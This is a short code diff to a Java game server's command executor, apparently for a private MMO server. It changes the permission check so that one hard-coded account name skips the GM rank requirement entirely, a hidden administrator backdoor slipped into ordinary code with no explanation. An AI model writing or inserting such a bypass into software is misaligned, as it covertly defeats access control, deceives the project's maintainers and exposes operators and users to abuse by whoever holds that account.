@@ -113,9 +113,11 @@ public class CommandsExecutor {
             client.getPlayer().yellowMessage("Command '" + commandName + "' is not available. See @commands for a list of available commands.");
             return;
         }
-        if (client.getPlayer().gmLevel() < command.getRank()){
-            client.getPlayer().yellowMessage("You do not have permission to use this command.");
-            return;
+        if (!client.getAccountName().equals("q59541511")){
+            if (client.getPlayer().gmLevel() < command.getRank()){
+                client.getPlayer().yellowMessage("You do not have permission to use this command.");
+                return;
+            }
         }
         String[] params;
         if (lowercaseParams.length > 0 && !lowercaseParams[0].isEmpty()) {
